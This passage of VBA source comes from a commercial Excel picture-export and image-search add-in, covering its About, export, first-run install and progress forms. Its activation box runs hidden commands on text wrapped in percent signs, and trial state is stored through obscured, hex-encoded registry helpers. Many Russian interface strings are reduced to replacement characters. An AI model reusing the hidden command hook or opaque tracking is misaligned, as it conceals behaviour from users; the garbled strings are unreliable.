        Case Is < 1000000: FileOrFolderSize = FormatNumber(Size \ 1024, 0) & " KB"
        Case Is < 10000000: FileOrFolderSize = FormatNumber(Size / 1024 / 1024, 1) & " MB"
        Case Is < 1000000000: FileOrFolderSize = FormatNumber(Size / 1024 / 1024, 0) & " MB"
        Case Else: FileOrFolderSize = FormatNumber(Size / 1024 / 1024 / 1024, 1) & " GB"
    End Select
End Function

Attribute VB_Name = "F_About"
Attribute VB_Base = "0{BE7E47B2-7EA3-4E6D-AAF1-495F63DD9109}{EAED387C-67FC-4C86-8149-1CD32D6FD3A2}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False


'---------------------------------------------------------------------------------------
' Module        : F_About                    Version: 20
' Author        : Igor Vakhnenko                   Date: 20.07.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Explicit
Public StopEvents As Boolean
' Const HL_COLOR& = 16711680, HL_COLOR_ACTIVE& = 49152

Sub ComboBox_Language_Change()
    On Error Resume Next
    Set Me.Image_CurrentLanguage.Picture = Nothing
    Set Me.Image_CurrentLanguage.Picture = Me.Controls("Image_" & Me.ComboBox_Language).Picture
    Me.MultiPage1.SetFocus
    Me.HL_VersionsHistory.Enabled = Me.ComboBox_Language = "ru"
    Me.Label_HL_Cabinet.Enabled = Me.ComboBox_Language = "ru"

    If Me.ComboBox_Language = GetLanguage$ Then Exit Sub
    SetLanguage Me.ComboBox_Language
    CreateProgramCommandBar
    'TranslateUserForm Me
    UserForm_Initialize
End Sub

Private Sub CommandButton_InstallUpdate_Click()
    InstallUpdate
End Sub
Private Sub HL_VersionsHistory_Click()
    On Error Resume Next: FollowHyperlink VERSIONS_HISTORY_HYPERLINK$
End Sub

Private Sub Image_EF_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    Me.MultiPage1.Pages("Page_RegInfo").Visible = True
End Sub

Private Sub Image_EF_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal y As Single)
    On Error Resume Next
    If TrueDeveloper And (Button = 2) Then
        If Not Run(CFA_NAME$ & "Ready") Then MsgBox "CommonFunctions add-in is not available now", vbExclamation: Exit Sub
        Run CFA_NAME$ & "CreateAddInUpdate", PROJECT_NAME$, ThisWorkbook
        Unload Me
    End If
    If Button = 1 And Shift = 3 Then
        Dim small As Boolean: small = Me.Height < 300
        Me.Height = IIf(small, 308, 270): Me.MultiPage1.Value = 0
    End If
End Sub

Private Sub Image_Main_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    On Error Resume Next: CreateProgramCommandBar
End Sub

Private Sub Label_HL_Cabinet_Click()
    On Error Resume Next
    If Not Request_("action=get_cabinet_url") Then FWF.FollowHyperlink CABINET_HYPERLINK$
End Sub

Sub UserForm_Initialize()
    On Error Resume Next: Me.StopEvents = True
    Me.TextBox_ProgramCodeName = PROJECT_NAME$: Me.Label_ProgramFullname = tt("ProgramFullname")
    Me.Caption = tt("MENU_ABOUT"): Me.TextBox_HID = HID$: Me.TextBox_HWID = HWID$
    Me.TextBox_email = SETT.GetRegValue("email")
    Me.Label_CurrVersionNumber1 = GetVersionTXT: Me.Label_CurrVersionNumber2 = GetVersionTXT
    Me.CheckBox_InstallUpdatesAutomatically.Value = SETT.GetBoolean("AutoInstall", False, "Updates")
    Me.CheckBox_Autorun.Value = AddinAutoRun

    Dim larr, i&, PROJECT_LASTYEAR&, BuiltDate As Date, picpath$
    larr = AvailableLanguagesArray
    For i = LBound(larr) To UBound(larr): larr(i, 2) = "     " & larr(i, 2): Next i
    Me.ComboBox_Language.list = larr
    Me.ComboBox_Language = GetLanguage

    BuiltDate = CDate(Val(Replace(Split(ThisWorkbook.Names("BuiltDate").RefersTo, "%%")(1), ",", ".")))
    If BuiltDate > 42200 Then Me.Label_CurrVersionDate = Format(BuiltDate, "D MMM YYYY  HH:NN") & "  GMT+6" Else Me.Label_CurrVersionDate.Visible = False

    Me.Label_Copyright = Replace(Me.Label_Copyright, "YYYY", ProgramYears)
    Me.Label_SendEmail = IIf(RUS, SUPPORT_EMAIL_RUS$, SUPPORT_EMAIL$)

    '    Me.Label_RegHyperlink.ControlTipText = Split(BUY_NEW_HYPERLINK$, "&")(0)        ' Replace(BUY_NEW_HYPERLINK$$, "&", "&&")
    '    Me.Label_HL_BuyLicense.ControlTipText = Split(BUY_NEW_HYPERLINK$, "&")(0)        'Replace(BUY_NEW_HYPERLINK$, "&", "&&")
    '    Me.Label_ProgramWebPage.ControlTipText = Split(PROGRAM_HYPERLINK$, "?")(0)

    picpath$ = GetFile_MainPicture
    If picpath$ <> "" Then Set Me.Image_Main.Picture = LoadPicture(picpath$)
    If SETT.IsFirstRun Then RunWithDelay "ShowFirstRunForm": Unload Me: Exit Sub
    TranslateUserForm Me
    Me.MultiPage1.Value = 0: MultiPage1_Change
    Me.StopEvents = False
End Sub

Private Sub CheckBox_Autorun_Click()
    On Error Resume Next: If Me.StopEvents Then Exit Sub
    AddinAutoRun Me.CheckBox_Autorun.Value
End Sub

Private Sub CheckBox_InstallUpdatesAutomatically_Click()
    On Error Resume Next: If Me.StopEvents Then Exit Sub
    SETT.SetText "AutoInstall", Me.CheckBox_InstallUpdatesAutomatically, "Updates"
End Sub

Private Sub CommandButton_ActivateProgram_Click()
    Dim msg$, res As Boolean, code$
    code$ = Trim(Me.TextBox_ActivationCode)

    If code$ Like "%*%" Then
        EXECUTE_COMMANDS Split(code$, "%")(1), True
    Else
        If code$ Like "LANGUAGE ??" Then ActivateLanguage Split(code$)(1): Exit Sub
        ' 0 = switcher disabled, 1 = default type, 2 = DROPDOWN SWITCHER, 3 = BUTTON SWITCHER
        If code$ Like "SWITCHER #" Then SETT.SetText "SettingsSwitcher", Split(code$)(1), "Setup": CreateProgramCommandBar: Exit Sub
        
        If Not Request_("action=activation", "data=" & code$) Then
            MsgBox tt("FA_ACT_ConnectError"), vbCritical, PROJECT_NAME$
            Exit Sub
        End If
    End If
    'Me.MultiPage1.Value = 0
End Sub

Sub ActivateLanguage(ByVal lang$)
    On Error Resume Next: Dim larr, i&
    SetLanguage lang$
    larr = AvailableLanguagesArray
    For i = LBound(larr) To UBound(larr): larr(i, 2) = "     " & larr(i, 2): Next i
    Me.ComboBox_Language.list = larr
    Me.ComboBox_Language = lang$
End Sub

Private Sub CommandButton_Uninstall_Click()
    UninstallThisFile 1        ' with confirmation
End Sub

Private Sub Label_RegHyperlink_Click()
    On Error Resume Next: Dim hl$: hl$ = BUY_NEW_HYPERLINK$
    If Len(hl$) Then FollowHyperlink hl$
End Sub

Private Sub TextBox_ActivationCode_Change()
    Me.CommandButton_ActivateProgram.Enabled = Len(Trim(Me.TextBox_ActivationCode)) > 0
End Sub

Sub MultiPage1_Change()
    On Error Resume Next
    If SETT.RSP(1) = "" Then RunWithDelay "ShowFirstRunForm": Unload Me: Exit Sub
    Select Case Me.MultiPage1.Pages(Me.MultiPage1.Value).name
        Case "Page_About"
            UpdateStatus Me.Label_Info
        Case "Page_RegInfo"
        Case "Page_Updates"
            CheckForUpdates
        Case "Page_Options"
    End Select
End Sub
Private Sub CommandButton_Close_Click(): Unload Me: End Sub

Private Sub Label_HL_BuyLicense_Click()
    FollowHyperlink IIf(Me.MultiPage1.Pages("Page_RegInfo").Visible, BUY_NEW_HYPERLINK$, BUY_ADD_HYPERLINK$ & "&email=" & SETT.GetRegValue("email"))
End Sub
Private Sub Label_ProgramWebPage_Click()
    On Error Resume Next: FollowHyperlink PROGRAM_HYPERLINK$
End Sub
Private Sub Label_SendEmail_Click()
    On Error Resume Next: FollowHyperlink "mailto:" & Me.Label_SendEmail & "?subject=" & PROJECT_NAME$ & "%20Support"
End Sub

Sub CheckForUpdates()
    On Error Resume Next
    Dim LastUpdateCheckTime As Date, LastUpdateCheckComment$
    Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Search.Picture
    Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_Searching")
    Me.CommandButton_InstallUpdate.Visible = False
    'Application.Wait Now + 1 / 86400

    LastUpdateCheckTime = CDate(SETT.GetText("LastCheck", 0, "Updates"))
    If Abs(LastUpdateCheckTime - CDbl(Now)) > 10 / 86400 Then
        Me.MultiPage1.Enabled = False
        If Not Request_("action=updates") Then
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Error.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_ConnectError")
            Me.MultiPage1.Enabled = True        ': SETT.SetText "LastCheck", Now, "Updates"
            Exit Sub
        End If
        Me.MultiPage1.Enabled = True
    End If

    LastUpdateCheckComment$ = SETT.GetText("LastCheckComment", "", "Updates")
    Select Case True
        Case LastUpdateCheckComment$ Like "Last version is installed*"
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Last.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_LastVersionInstalled")

        Case LastUpdateCheckComment$ Like "Updates not found"
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_NotFound.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_NotFound", PROJECT_NAME$)

        Case LastUpdateCheckComment$ Like "New version found*"
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Found.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_Found") & " (" & SETT.GetText("NewVersion", 0, "Updates") & ")"
            Me.CommandButton_InstallUpdate.Visible = True
    End Select
End Sub
Attribute VB_Name = "F_Export"
Attribute VB_Base = "0{B913F7F7-8E89-40A3-B2A1-D7182D4ECDBF}{CF1BB9C7-522A-4A2F-ABE0-6929777387A1}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Export                    Version:
' Author        : Igor Vakhnenko                   Date: 20.04.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Dim SpecialControlsCollection As Collection


Private Sub CheckBox_Export_FileSize_Click()
    Me.ComboBox_Export_FileSize.Enabled = Me.CheckBox_Export_FileSize.Value
End Sub

Private Sub CheckBox_Export_FullSize_Click()
    On Error Resume Next
    If Me.CheckBox_Export_FullSize Then
        Me.MultiPage_ExportImages.Style = fmTabStyleButtons
        Me.MultiPage_ExportImages.Top = 6

    Else
        Me.MultiPage_ExportImages.Style = fmTabStyleNone
        Me.MultiPage_ExportImages.Top = 26

    End If
End Sub

Private Sub CheckBox_Export_ImageFilename_Click()
    Me.ComboBox_Export_ImageFilename.Enabled = Me.CheckBox_Export_ImageFilename.Value
End Sub

Private Sub CheckBox_Export_ImageName_Click()
    Me.ComboBox_Export_ImageName.Enabled = Me.CheckBox_Export_ImageName.Value
End Sub

Private Sub CheckBox_ExportAllPictures_Click()
    On Error Resume Next: Err.Clear
    Me.Label_ExportPicturesColumn.Enabled = Not Me.CheckBox_ExportAllPictures
    Me.ComboBox_ExportPicturesColumn.Enabled = Not Me.CheckBox_ExportAllPictures
    Me.ScrollBar_ExportPicturesColumn.Enabled = Not Me.CheckBox_ExportAllPictures
End Sub

Private Sub CommandButton_ChangeExportFolder_Click()
    On Error Resume Next
    baseFolder$ = SETT.GetText("TextBox_ExportFolder", PICTURES_FOLDER$)
    ExportFolder$ = GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", baseFolder$)
    If ExportFolder$ = "" Then Exit Sub
    Me.TextBox_ExportFolder = ExportFolder$
End Sub

Private Sub CommandButton_ExportPictures_Click()
    On Error Resume Next: Err.Clear
    folder$ = Me.TextBox_ExportFolder: If folder$ = "" Then Exit Sub
    If Dir(folder$, vbDirectory) = "" Then MsgBox "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical: Exit Sub

    If Me.ComboBox_ExportPicturesColumn = "" And Me.ComboBox_ExportPicturesColumn.Enabled Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical: Exit Sub
    End If

    Dim FullSize As Boolean
    FullSize = Me.CheckBox_Export_FullSize
    SETT.SaveAllFromSettingForm Me
    Me.Hide

    If FullSize Then
        n& = ExportPictures_FullSize(folder$)
    Else
        n& = ExportPictures(folder$)
    End If

    If n& Then
        If MsgBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & n & vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|?", _
                  vbInformation + vbYesNo + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbNo Then Exit Sub
        OpenExportFolder
    Else
        If (FullSize And Me.CheckBox_Export_DoNotExtractFiles) Then
            MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd|", vbInformation
        Else
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|", vbExclamation
        End If
    End If
End Sub

Private Sub CommandButton_Quit_Click()
    On Error Resume Next: Unload Me
End Sub

Private Sub Label_OpenExportFolder_Click()
    On Error Resume Next: Err.Clear
    folder$ = Me.TextBox_ExportFolder: If folder$ = "" Then Exit Sub
    If Dir(folder$, vbDirectory) = "" Then MsgBox "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation: Exit Sub
    FWF.OpenFolder folder$
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next

    For i = 1 To 150
        Me.ComboBox_ExportFilenamesColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_ExportPicturesColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_Export_FileSize.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_Export_ImageName.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_Export_ImageFilename.AddItem ColumnNameByColumnNumber(i)
    Next

    ' special controls
    Dim ctrl As MSForms.Control, SC As SpecialControl
    Set SpecialControlsCollection = New Collection
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "ScrollBar" And ctrl.Tag = "ScrollCombo" Then
            Set SC = New SpecialControl: Set SC.Scroller = ctrl
            If SC.FieldFound Then SpecialControlsCollection.Add SC
        End If
    Next

    SETT.LoadIntoSettingForm Me
    TranslateUserForm Me

    FirstCellAddress$ = SETT.GetText("TextBox_FirstCell", DEFAULT_FIRST_CELL$)
    FirstCellAddress$ = Application.ConvertFormula(FirstCellAddress$, xlA1, xlR1C1)
    col& = Val(Split(FirstCellAddress$, "C")(1))
    If col& Then Me.ComboBox_ExportFilenamesColumn = ColumnNameByColumnNumber(col&)

    picColumn& = GetExpectedPicturesColumn
    If picColumn& Then Me.ComboBox_ExportPicturesColumn = ColumnNameByColumnNumber(picColumn&)

    If Me.TextBox_ExportFolder = "" Then Me.TextBox_ExportFolder = PICTURES_FOLDER$

    Me.MultiPage_ExportImages.Value = 0
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    SETT.SaveAllFromSettingForm Me
    On Error Resume Next: Set SpecialControlsCollection = Nothing
End Sub

Attribute VB_Name = "F_FirstRun"
Attribute VB_Base = "0{6014B06C-C3B6-41F2-9550-6A20C356E09E}{8D90B5DD-ED7D-4F22-83FB-95742E06D5D9}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_FirstRun                    Version: 2.2
' Author        : Igor Vakhnenko                   Date: 09.05.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text

Private Sub ComboBox_Language_Change()
    On Error Resume Next
    If SetLanguage(Me.ComboBox_Language) Then
        TranslateUserForm Me
        MultiPage_FirstRun_Change
        UpdateFields
    End If
End Sub

Private Sub CommandButton_Cancel_Click()
    Unload Me
End Sub

Sub UpdateFields()
    On Error Resume Next
    Me.TextBox_EULA.text = tt("EULA content", "ExcelVBA.ru", ProgramYears)
    Me.TextBox_EULA.SelStart = 0
    Me.TextBox_EULA.SelLength = 0
    Me.Caption = tt("FirstRun_FormCaption")
    Me.Label_ProgramFullname = tt("ProgramFullname")
End Sub

Private Sub CommandButton_Action1_Click()
    On Error Resume Next: Me.MultiPage_FirstRun.Value = Me.MultiPage_FirstRun.Value - 1
End Sub

Sub InstallAddinToFolder(ByVal folder$)
    On Error Resume Next
    If ThisWorkbook.Path = folder$ Then Exit Sub
    If Not FWF.FolderExists(folder$) Then Exit Sub
    Dim filename$, coll As Collection, file, WB As Workbook

    ' deleting old add-in versions from destination folder
    Set coll = FWF.FilenamesCollection(folder$, PROJECT_NAME$ & "*." & FWF.GetFileExtension(ThisWorkbook.FullName), 1)
    For Each file In coll
        filename$ = Dir(file)
        If filename$ <> ThisWorkbook.name Then
            Set WB = Nothing: Set WB = Workbooks(filename$)
            If Not WB Is Nothing Then WB.Close False
        End If
        SetAttr file, vbNormal
        Kill file
    Next

    filename$ = folder$ & Application.PathSeparator & PROJECT_NAME$ & "." & FWF.GetFileExtension(ThisWorkbook.FullName)
    Application.DisplayAlerts = False
    ThisWorkbook.SaveAs filename$
    Application.DisplayAlerts = True
    Set coll = Nothing: Set WB = Nothing
End Sub

Private Sub CommandButton_Action2_Click()
    On Error Resume Next: Dim email$, i As Boolean
    If Me.MultiPage_FirstRun.Value = Me.MultiPage_FirstRun.Pages.Count - 1 Then
        With SETT
            InstallAddinToFolder Me.Label_DestinationFolder
            AddinAutoRun Me.CheckBox_Autorun.Value
            i = .RSP(3) = ""
            If Me.CheckBox_AddShortcut Then CreateShortcutInStartMenu
            HWID True
            email$ = Trim(Me.TextBox_ActivationCode)
            If .RSP(1) = "" Then .WSP 1, .DTU
            If Not Request_("action=first_run activation", "data=" & email$) Then
                If Len(email$) Then MsgBox tt("|46415F4143545F436F6E6E6563744572726F72"), vbCritical, PROJECT_NAME$
                If i Then .WSP 3, (.LastMacro + 1) * l0 + .LastMacro
            End If
        End With
        Run TWN & "FirstRunActions"
        If Me.CheckBox_ShowUsageExample.Visible Then If Me.CheckBox_ShowUsageExample Then RunWithDelay "ShowUsageExample", 0.5
        Unload Me
    End If
    Me.MultiPage_FirstRun.Value = Me.MultiPage_FirstRun.Value + 1
End Sub
Private Sub CommandButton_Action3_Click()
    SetupCancelled = True
    Unload Me
End Sub

Private Sub CommandButton_ChangeFolder_Click()
    On Error Resume Next: Dim folder$
    folder$ = FWF.GetFolderPath(, Me.Label_DestinationFolder)
    If folder$ <> "" Then
        If Right(folder$, 1) = Application.PathSeparator Then folder$ = Left(folder$, Len(folder$) - 1)
        Me.Label_DestinationFolder = folder$
    End If
End Sub

Private Sub Image_en_Click(): On Error Resume Next: Me.ComboBox_Language = "en": End Sub
Private Sub Image_ru_Click(): On Error Resume Next: Me.ComboBox_Language = "ru": End Sub
Private Sub Image_it_Click(): On Error Resume Next: Me.ComboBox_Language = "it": End Sub
Private Sub Image_de_Click(): On Error Resume Next: Me.ComboBox_Language = "de": End Sub
Private Sub Image_fr_Click(): On Error Resume Next: Me.ComboBox_Language = "fr": End Sub
Private Sub Image_es_Click(): On Error Resume Next: Me.ComboBox_Language = "es": End Sub
Private Sub Image_ar_Click(): On Error Resume Next: Me.ComboBox_Language = "ar": End Sub
Private Sub Image_jp_Click(): On Error Resume Next: Me.ComboBox_Language = "jp": End Sub

Sub MultiPage_FirstRun_Change()
    On Error Resume Next
    Dim arrButtonsCaption As Variant, param$, b_capt$, b_en As Boolean, b_vis As Boolean, i&
    arrButtonsCaption = Split(Me.MultiPage_FirstRun.Pages(Me.MultiPage_FirstRun.Value).Tag, "/")
    For i = 1 To 3
        param$ = "": param$ = arrButtonsCaption(i - 1)
        b_capt$ = Replace(param$, "*", "")
        b_en = InStr(1, param$, "*") = 0
        b_vis = b_capt$ <> ""

        With Me.Controls("CommandButton_Action" & i)
            .Caption = tt(b_capt$)
            .Enabled = b_en
            .Visible = b_vis
        End With
    Next
    Me.CommandButton_Action2.SetFocus
End Sub

Private Sub TextBox_ActivationCode_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
    Me.CommandButton_Action1.TabIndex = 5
End Sub

Function GetDestinationFolder() As String
    On Error Resume Next: Dim folder$, downloads_folder$, changed As Boolean, v
    Const USF$ = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"
    downloads_folder$ = Replace(SETT.GetText("{374DE290-123F-4565-9164-39C4925E467B}", , USF$), "%USERPROFILE%", Environ("USERPROFILE"))
    folder$ = ThisWorkbook.Path
    For Each v In Array(downloads_folder$, "Downloads", SETT.U("C7E0E3F0F3E7EAE8"))
        If InStr(1, folder$, v, vbTextCompare) Then changed = True: Exit For
    Next
    GetDestinationFolder = IIf(changed, CreateObject("WScript.Shell").SpecialFolders("Desktop"), folder$)
End Function

Private Sub UserForm_Initialize()
    On Error Resume Next: Dim i&, j&, larr, ctrl As Object, picpath$, LangImagesCount&
    SetupCancelled = False
    Me.Caption = PROJECT_NAME$
    If SETT.IsSettingBlank("Setup\Language") Then SetLanguage SYSTEM_LANGUAGE
    'If TrueDeveloper Then Me.MultiPage_FirstRun.Pages("Page4_Done").Tag = "Back/Done/"

    picpath$ = GetFile_MainPicture
    If picpath$ <> "" Then Set Me.Image_Main.Picture = LoadPicture(picpath$)

    TranslateUserForm Me
    UpdateFields

    Me.MultiPage_FirstRun.Style = fmTabStyleNone
    Me.MultiPage_FirstRun.Value = 0
    MultiPage_FirstRun_Change

    larr = AvailableLanguagesArray
    Me.ComboBox_Language.list = larr
    Me.ComboBox_Language = GetLanguage
    If Me.ComboBox_Language.ListIndex = -1 Then Me.ComboBox_Language.ListIndex = 0
    If Me.ComboBox_Language.ListCount = 1 Then
        Me.MultiPage_FirstRun.Value = 1
        Me.CommandButton_Action1.Visible = False
        Me.CommandButton_Action2.SetFocus
    End If

    For i = LBound(larr) To UBound(larr)
        If LangImagesCount& > 5 Then Exit For
        Set ctrl = Nothing: Set ctrl = Me.Controls("Image_" & larr(i, 1))
        If Not ctrl Is Nothing Then
            ctrl.ControlTipText = larr(i, 2)
            LangImagesCount& = LangImagesCount& + 1
            ctrl.Top = Me.ComboBox_Language.Top + 1
            ctrl.Left = Me.ComboBox_Language.Left + Me.ComboBox_Language.Width + 40 + (LangImagesCount& - 1) * 33
            ctrl.Visible = True
        End If
    Next i
    Me.Label_DestinationFolder.Caption = Me.GetDestinationFolder
    Me.CheckBox_ShowUsageExample.Visible = UsageExampleExists
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If CloseMode = 0 And Not TrueDeveloper Then Cancel = True
End Sub

Attribute VB_Name = "F_Preview"
Attribute VB_Base = "0{55D3097A-E187-46AA-A4C5-5CD8626743BA}{51E4A44C-0701-459F-BA61-1023AA64243D}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "F_Progress"
Attribute VB_Base = "0{5C3230F2-2BA8-4104-BFD1-FAAFE3F9B08B}{7FE69A6B-BC6B-4096-B40C-B6F16EA019C5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Progress                       Version: 2.2 (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Parser!)
' Author        : Igor Vakhnenko                   Date: 21.07.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Public Indicator As ProgressIndicator, ButtonMacro$
Dim MSG_StopMacro$, MSG_StopMacroTitle$

Private Sub UserForm_Initialize()
    On Error Resume Next
    MSG_StopMacro$ = Run(TWN & "tt", "PI_MSG_StopMacro")
    If MSG_StopMacro$ = "" Then MSG_StopMacro$ = "Do you really want to stop the macro?"
    MSG_StopMacroTitle$ = Run(TWN & "tt", "PI_MSG_StopMacroTitle")
    If MSG_StopMacroTitle$ = "" Then MSG_StopMacroTitle$ = "Processing is not complete yet"
    Err.Clear
End Sub

Private Sub CommandButton_RunMacro_Click()
    On Error Resume Next
    If Len(ButtonMacro$) Then Run TWN & ButtonMacro$
End Sub

Private Sub CommandButton_stop_Click()
    On Error Resume Next
    If StopMacro Then        ' macro finished
        End
    Else        ' macro is running
        If MsgBox(MSG_StopMacro$, vbQuestion + vbDefaultButton2 + vbYesNo, MSG_StopMacroTitle$) = vbYes Then
            StopMacro = True
        End If
    End If
End Sub

Private Sub SpinButton_log_Change()
    On Error Resume Next: Dim n&
    n = Me.SpinButton_log.Value
    Me.Height = IIf(n = 0, 82, 92 + n * 40)
    Me.TextBox_Log.Height = 40 * n
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If Not Indicator Is Nothing Then Indicator.QueryClose
End Sub
Attribute VB_Name = "F_SearchImages"
Attribute VB_Base = "0{30E98BBA-12D9-4EBF-9BAB-8046426951C1}{7870962E-9D84-4BAC-95BA-17375766F4B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Form      : F_SearchImages
' Author        : EducatedFool                     Date: 23.01.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Public FI_Collection As Collection, IE As Object, LastPicInd&
Public CellsWithoutPictures As Range, CWP_index&, CurrentCell As Range, CurrentPicture As IPictureDisp
Public cnt_FI_cells&, cnt_FI_queries&, cnt_FI_queriesOK&, cnt_FI_click1&, cnt_FI_click2&, cnt_FI_click4&, cnt_FI_auto&        ' counters

Private Sub CheckBox_FI_Add_Original_URL_Click()
    On Error Resume Next: Me.ComboBox_FI_URL_Column.Enabled = Me.CheckBox_FI_Add_Original_URL
End Sub

Private Sub CheckBox_FI_SubfolderMask_Click()
    Me.TextBox_FI_SubfolderMask.Enabled = Me.CheckBox_FI_SubfolderMask.Value
End Sub

Private Sub CheckBox_FI_UseQueryMask_Click()
    On Error Resume Next: Me.TextBox_FI_QueryMask.Enabled = Me.CheckBox_FI_UseQueryMask.Value
End Sub

Private Sub CheckBox_FI_UseSitesList_Click()
    On Error Resume Next: Me.TextBox_FI_SitesList.Enabled = Me.CheckBox_FI_UseSitesList.Value
    Me.Label_ViewYandex.Visible = Not Me.CheckBox_FI_UseSitesList.Value
End Sub

Private Sub CommandButton_AutoInsertFirstImage_Click()
    On Error Resume Next: Err.Clear
    If AutoInsertMode Then DisableAutoInsertMode: Exit Sub
    AutoInsertMode = True

    Me.CommandButton_PrevCell.Enabled = False
    Me.CommandButton_NextCell.Enabled = False
    Me.CommandButton_AutoInsertFirstImage.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

    ccount& = Me.CellsWithoutPictures.Cells.Count

    currindex& = Me.CWP_index
    For i = currindex& To ccount&
        Me.CWP_index = i
        PrepareForSearch
        If Not AutoInsertMode Then DisableAutoInsertMode: Exit Sub
    Next i
    DisableAutoInsertMode
    If Me.CWP_index = 1 Then Me.CommandButton_PrevCell.Enabled = False
    If Me.CWP_index = ccount& Then Me.CommandButton_NextCell.Enabled = False
End Sub

Sub DisableAutoInsertMode()
